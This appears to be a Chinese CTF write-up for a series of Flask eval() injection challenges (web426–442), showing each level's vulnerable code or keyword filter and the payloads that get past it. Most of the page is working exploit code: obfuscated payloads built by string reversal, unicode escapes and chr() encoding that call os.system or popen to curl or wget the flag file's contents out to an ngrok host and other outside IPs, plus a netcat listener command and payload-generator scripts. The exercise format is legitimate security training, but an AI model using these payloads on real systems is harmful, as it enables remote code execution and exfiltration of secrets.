<h1 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<h1 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<h1 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<h1 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<p>匹配有问题,前面加个空格</p>
<h1 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<h1 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	reg = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;os|open|system|read|eval|str&#x27;</span>)</span><br><span class="line">    	<span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==None:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code= <span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

<h1 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h1><p>过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">80</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(__builtins__.__dict__[<span class="string">&#x27;__impo&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;rt__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;s&#x27;</span>).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h1 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h1><p>过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h1 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).<span class="title function_ invoke__">__getattribute__</span>(<span class="string">&#x27;syste&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;m&#x27;</span>)(<span class="string">&#x27;cu&#x27;</span>%<span class="number">2</span>b<span class="string">&#x27;rl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;wget http://xx.xx.xx.xx?1=`cat /fl*`&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h1 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h1><p>过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;import o\x73;o\x73.\x73ystem(\&quot;\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0032\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0033\\u0037\\u002e\\u0032\\u0031\\u0032\\u003f\\u0031\\u003d\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0060\&quot;)&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&#123;12:c&#125;&#123;13:c&#125;&#123;14:c&#125;&#123;15:c&#125;&#123;16:c&#125;&#123;17:c&#125;&#123;18:c&#125;&#123;19:c&#125;&#123;20:c&#125;&#123;21:c&#125;&#123;22:c&#125;&#123;23:c&#125;&#123;24:c&#125;&#123;25:c&#125;&#123;26:c&#125;&#123;27:c&#125;&#123;28:c&#125;&#123;29:c&#125;&#123;30:c&#125;&#123;31:c&#125;&#123;32:c&#125;&#123;33:c&#125;&#123;34:c&#125;&#123;35:c&#125;&#123;36:c&#125;&#123;37:c&#125;&#123;38:c&#125;&#123;39:c&#125;&#123;40:c&#125;&#123;41:c&#125;&#123;42:c&#125;&#123;43:c&#125;&#123;44:c&#125;&#123;45:c&#125;&#123;46:c&#125;&#123;47:c&#125;&#123;48:c&#125;&#123;49:c&#125;&#123;50:c&#125;&#123;51:c&#125;&#123;52:c&#125;&#123;53:c&#125;&#123;54:c&#125;&#123;55:c&#125;&#123;56:c&#125;&#123;57:c&#125;&#123;58:c&#125;&#123;59:c&#125;&#123;60:c&#125;&#123;61:c&#125;&#123;62:c&#125;&quot;</span>.<span class="title function_ invoke__">format</span>(<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">59</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">108</span>,<span class="number">32</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">47</span>,<span class="number">52</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">57</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">46</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">63</span>,<span class="number">49</span>,<span class="number">61</span>,<span class="number">96</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">96</span>,<span class="number">34</span>,<span class="number">41</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += (<span class="string">&quot;&#123;&quot;</span>+f<span class="string">&quot;&#123;j&#125;:c&quot;</span>+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">res += <span class="string">&#x27;&quot;.format(&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i in s:</span><br><span class="line">    res += f<span class="string">&#x27;&#123;ord(i)&#125;,&#x27;</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">res = res[:-<span class="number">1</span>]</span><br><span class="line">res = res+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">print</span>(res)</span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">eval</span>(res))</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<h1 id="web436-439"><a href="#web436-439" class="headerlink" title="web436-439"></a>web436-439</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">436</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr</span><br><span class="line"></span><br><span class="line"><span class="number">437</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr</span><br><span class="line"></span><br><span class="line"><span class="number">438</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">439</span>过滤了os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<h1 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h1><p>过滤了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os|open|system|read|<span class="keyword">eval</span>|builtins|curl|_|getattr|&#123;|<span class="string">&#x27;|&quot;</span></span><br></pre></td></tr></table></figure>

<p>没有了引号，我们可以用chr构造字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;)&quot;</span></span><br><span class="line">def <span class="title function_ invoke__">ccchr</span>(s):</span><br><span class="line">	t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(s)):</span><br><span class="line">		<span class="keyword">if</span> i&lt;<span class="title function_ invoke__">len</span>(s)-<span class="number">1</span>:</span><br><span class="line">			t+=<span class="string">&#x27;chr(&#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">ord</span>(s[i]))+<span class="string">&#x27;)%2b&#x27;</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			t+=<span class="string">&#x27;chr(&#x27;</span>+<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">ord</span>(s[i]))+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">	<span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;?code=str(exec(&#x27;</span>+<span class="title function_ invoke__">ccchr</span>(s)+<span class="string">&#x27;))&#x27;</span>)</span><br><span class="line"><span class="comment">#?code=str(exec(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(98)%2bchr(52)%2bchr(50)%2bchr(51)%2bchr(45)%2bchr(49)%2bchr(49)%2bchr(49)%2bchr(45)%2bchr(49)%2bchr(55)%2bchr(45)%2bchr(49)%2bchr(57)%2bchr(52)%2bchr(45)%2bchr(57)%2bchr(49)%2bchr(46)%2bchr(110)%2bchr(103)%2bchr(114)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(105)%2bchr(111)%2bchr(58)%2bchr(56)%2bchr(48)%2bchr(63)%2bchr(112)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(39)%2bchr(41)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h1><p>在上面的方法上用request进行了优化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">chr</span>(<span class="number">97</span>))))&amp;a=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">str</span>().<span class="title function_ invoke__">join</span>([<span class="title function_ invoke__">chr</span>(<span class="number">105</span>),<span class="title function_ invoke__">chr</span>(<span class="number">109</span>),<span class="title function_ invoke__">chr</span>(<span class="number">112</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">114</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">59</span>),<span class="title function_ invoke__">chr</span>(<span class="number">111</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">121</span>),<span class="title function_ invoke__">chr</span>(<span class="number">115</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">101</span>),<span class="title function_ invoke__">chr</span>(<span class="number">109</span>),<span class="title function_ invoke__">chr</span>(<span class="number">40</span>),<span class="title function_ invoke__">chr</span>(<span class="number">34</span>),<span class="title function_ invoke__">chr</span>(<span class="number">99</span>),<span class="title function_ invoke__">chr</span>(<span class="number">117</span>),<span class="title function_ invoke__">chr</span>(<span class="number">114</span>),<span class="title function_ invoke__">chr</span>(<span class="number">108</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">104</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">112</span>),<span class="title function_ invoke__">chr</span>(<span class="number">58</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">52</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">57</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">51</span>),<span class="title function_ invoke__">chr</span>(<span class="number">55</span>),<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">50</span>),<span class="title function_ invoke__">chr</span>(<span class="number">63</span>),<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),<span class="title function_ invoke__">chr</span>(<span class="number">61</span>),<span class="title function_ invoke__">chr</span>(<span class="number">96</span>),<span class="title function_ invoke__">chr</span>(<span class="number">99</span>),<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),<span class="title function_ invoke__">chr</span>(<span class="number">116</span>),<span class="title function_ invoke__">chr</span>(<span class="number">32</span>),<span class="title function_ invoke__">chr</span>(<span class="number">47</span>),<span class="title function_ invoke__">chr</span>(<span class="number">102</span>),<span class="title function_ invoke__">chr</span>(<span class="number">108</span>),<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),<span class="title function_ invoke__">chr</span>(<span class="number">103</span>),<span class="title function_ invoke__">chr</span>(<span class="number">96</span>),<span class="title function_ invoke__">chr</span>(<span class="number">34</span>),<span class="title function_ invoke__">chr</span>(<span class="number">41</span>)])</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="web442"><a href="#web442" class="headerlink" title="web442"></a>web442</h1><p>过滤了数字</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="title function_ invoke__">exec</span>(request.args.<span class="title function_ invoke__">get</span>(request.method)))&amp;GET=<span class="title function_ invoke__">__import__</span>(<span class="string">&#x27;os&#x27;</span>).<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#x27;</span>)</span><br></pre></td></tr></table></figure>

